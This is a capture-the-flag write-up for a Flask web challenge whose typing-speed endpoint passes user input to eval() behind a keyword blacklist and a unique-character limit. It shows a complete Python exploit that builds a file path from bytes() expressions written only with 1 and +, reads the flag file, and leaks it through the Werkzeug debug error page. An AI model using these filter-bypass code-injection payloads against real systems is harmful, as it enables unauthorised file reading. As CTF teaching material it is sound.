# wpm-game Writeup

**CTF:** Script Sorcerers CTF  
**Category:** Web  
**Flag:** `scriptCTF{t1ny_fl4g_1337_5f1c22d42286}`

---

## Challenge Overview

A web service that measures WPM (Words Per Minute) typing speed.  
The `/rate?wpm=<value>` endpoint evaluates how fast you type based on the number you provide.

---

## Source Code Analysis

```python
def rate(wpm) -> float:
    if wpm < 50:
        return "slow"
    if wpm < 100:
        return "progressing"
    if wpm < 200:
        return "good"
    if wpm < 350:
        return "goated"
    if wpm > 900:
        return "even robots can't do that"

def check(string):
    string = string.lower()
    disallowed = [".","_","import", "=", ",", "'", '"', "attr",
                  "global", "local", ";", ":", "^", "/", ">", "<",
                  "{", "}", "m", "a", "not", "and", "or", "eval",
                  "exec", "for", "in", "chr", "ord", "hex", "int",
                  "repr", "str", "dir", "set", "len", "SENTENCES",
                  "random", "request", "app", "flask"]
    c = any([x in string for x in disallowed])
    non_ascii = any([ord(x) < 32 for x in string]) or any([ord(x) > 126 for x in string])
    return c or non_ascii or len(set(string)) > 18

@app.route("/rate")
def rate_wpm():
    try:
        wpm = request.args.get("wpm", "")
    except ValueError:
        return jsonify(error="invalid wpm"), 400
    if check(wpm):
        return "Invalid WPM!"
    return jsonify(verdict=rate(eval(wpm.lower())), wpm=float(wpm))
```

### Core Vulnerability

`eval(wpm.lower())` executes user input directly → **arbitrary Python code execution**.

Additionally, `app.run('0.0.0.0', debug=True)` means the **Werkzeug debugger is enabled**.  
When a runtime error occurs, the error message along with variable contents is exposed on the page.

---

## Filter Analysis

Constraints enforced by the `check()` function:

|Constraint|Detail|
|---|---|
|Banned characters|`. _ ' " , ; : ^ / > < { } m a`|
|Banned keywords|`import`, `eval`, `exec`, `for`, `in`, `chr`, `ord`, `int`, `str`, `set`, `len`, etc.|
|**Unique character count**|**`len(set(string)) <= 18`**|
|ASCII range|Only 32–126 allowed|

---

## Exploit Strategy

The plan is to read the flag file using `open(path)`, then trigger a KeyError via `dict()[key]`  
so the flag gets exposed in the Werkzeug debugger error page:

```
dict()[next(open("/app/flag.txt"))]
→ next() returns the first line of the file (a string)
→ dict()[flag_string] → KeyError is raised
→ Werkzeug debugger: KeyError: 'scriptCTF{...}' is shown on the error page
```

The problem is that `'`, `"`, `/`, `a`, `m` are all blocked,  
so the path `"/app/flag.txt"` cannot be written as a string literal.

→ **Build the path using `bytes([n])` instead of a string literal**

```python
# "/app/flag.txt" expressed as bytes
bytes([47])  +  bytes([97])  +  bytes([112])  +  bytes([112])  + ...
#  /               a               p               p
```

`open()` also accepts a bytes object as a path, so this approach works.

---

## Problem: 18 Unique Character Limit

The first idea was to write the numbers directly:

```python
bytes([47]) + bytes([97]) + bytes([112]) + ...
```

But this requires the digits `0–9` (10 characters) plus all the other symbols and function names,  
which easily **exceeds the 18 unique character limit**.

---

## Solution: Express Numbers Using Only `1` and `+`

Instead of writing numbers directly, **represent every number using only `1` and `+`**.  
This reduces the set of numeric characters to just `1`.

The naive approach of adding `1` repeatedly is too long:

```python
# To express 112:
1+1+1+1+1+ ... (112 times)  # way too long
```

→ Use **binary expansion** to express any number much more concisely.

---

## `num_expr()` — Detailed Explanation

```python
def num_expr(n):
    bits = bin(n)[2:]   # Convert n to binary string (e.g. 47 → '101111')
    expr = "1"          # The first bit is always 1
    for b in bits[1:]:  # Process each subsequent bit left to right
        if b == "0":
            expr = f"({expr}+{expr})"      # Double the current value
        else:
            expr = f"({expr}+{expr}+1)"    # Double the current value and add 1
    return expr
```

### Core Principle

Reading the binary representation left to right,  
**repeatedly doubling (or doubling + 1)** the current value reconstructs any integer.

This directly mirrors the definition of binary numbers:

- Bit is `0` → current value × 2
- Bit is `1` → current value × 2 + 1

Since `x + x` is mathematically equivalent to `x * 2`,  
no multiplication operator is needed — only addition.

### Example: `num_expr(11)`

```
11 in binary: 1011

Step 1: first bit '1' → expr = "1"                               (value: 1)
Step 2: bit '0'       → expr = "(1+1)"                           (value: 2)
Step 3: bit '1'       → expr = "((1+1)+(1+1)+1)"                (value: 5)
Step 4: bit '1'       → expr = "(((1+1)+(1+1)+1)+((1+1)+(1+1)+1)+1)"  (value: 11)
```

Verification:

```
(1+1) = 2
(2+2+1) = 5
(5+5+1) = 11  ✓
```

### Example: `num_expr(47)` — ASCII code of `/`

```
47 in binary: 101111

Step 1: '1' → expr = "1"                    (value: 1)
Step 2: '0' → expr = "(1+1)"               (value: 2)
Step 3: '1' → expr = "((1+1)+(1+1)+1)"     (value: 5)
Step 4: '1' → double + 1                    (value: 11)
Step 5: '1' → double + 1                    (value: 23)
Step 6: '1' → double + 1                    (value: 47)  ✓
```

With this method, **every ASCII code can be expressed using only `1`**,  
completely eliminating the need for digit characters `0–9`.

### Why `x+x` instead of `x*2`?

Using `*` would add a 19th unique character and trigger the filter.  
Since `x + x` is mathematically identical to `x * 2`, the same result is achieved without multiplication.

---

## Fitting Within 18 Unique Characters

The complete set of unique characters in the final payload:

```
(  )  +  1  [  ]  b  y  t  e  s  o  p  n  x  d  i  c
1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18
```

- `bytes` → `b y t e s`
- `open` → `o p e n` (`e` shared)
- `next` → `n e x t` (`n`, `e`, `t` shared)
- `dict` → `d i c t` (`t` shared)
- Symbols → `( ) + 1 [ ]`

Exactly **18 unique characters** — right at the limit.

---

## URL Encoding Issue

nginx sits as a reverse proxy in front of Flask, causing two problems:

**Problem 1: 414 URI Too Large**  
nginx's default URI length limit is hit.

**Problem 2: `+` is interpreted as a space**  
In query strings, `+` means a space character — every `+` in the payload gets replaced with .  
Locally (`127.0.0.1:5000`) this wasn't an issue because Flask received the raw query string directly,  
but remotely nginx parses it first before passing it to Flask.

**Solution:** encode only `+` as `%2B` and leave everything else unencoded to minimize URI length.

```python
encoded = urllib.parse.quote(payload, safe="()[]1bytesopnxdict")
# Characters in safe= are left as-is
# + is not in safe=, so it gets encoded as %2B
```

Using `params={"wpm": payload}` encodes every special character as `%XX`,  
making the URI more than 3x longer — not viable. The URL must be constructed manually.

---

## Final Exploit

```python
import urllib.parse
import requests

def num_expr(n):
    bits = bin(n)[2:]
    expr = "1"
    for b in bits[1:]:
        if b == "0":
            expr = f"({expr}+{expr})"
        else:
            expr = f"({expr}+{expr}+1)"
    return expr

def byte_of(n):
    return "bytes([" + num_expr(n) + "])"

def path_expr(path):
    return "+".join(byte_of(ord(c)) for c in path)

def make_payload(path):
    return "dict()[next(open(" + path_expr(path) + "))]"

payload = make_payload("/app/flag.txt")
print(f"len={len(payload)}, set_len={len(set(payload))}")
# len=3863, set_len=18

encoded = urllib.parse.quote(payload, safe="()[]1bytesopnxdict")
url = "https://<challenge-url>/rate?wpm=" + encoded

r = requests.get(url)
print(r.status_code)
print(r.text)
# KeyError: 'scriptCTF{t1ny_fl4g_1337_5f1c22d42286}\n'
```

---

## How It Works

```
eval("dict()[next(open(bytes([47])+bytes([97])+bytes([112])+ ...))]")
                                ↓
              bytes combined → b"/app/flag.txt"
                                ↓
              open(b"/app/flag.txt") → file handle
                                ↓
              next(...) → "scriptCTF{t1ny_fl4g_1337_5f1c22d42286}\n"
                                ↓
              dict()["scriptCTF{...}"] → KeyError raised
                                ↓
              Werkzeug debugger (debug=True) exposes flag in error page
```

---

## Key Takeaways

| Problem                               | Solution                                                       |
| ------------------------------------- | -------------------------------------------------------------- |
| No string literals (`'`, `"` banned)  | Build path with `bytes([n])` concatenation                     |
| Digits exceed unique char limit       | Express numbers via binary expansion using only `1` and `+`    |
| `*` would add a 19th unique character | Use `x+x` instead of `x*2`                                     |
| nginx interprets `+` as space         | Use `urllib.parse.quote(safe=...)` to encode only `+` as `%2B` |
| nginx URI length limit                | Keep as many characters unencoded as possible                  |
| Flag extraction                       | Exploit Werkzeug debugger KeyError page with `debug=True`      |
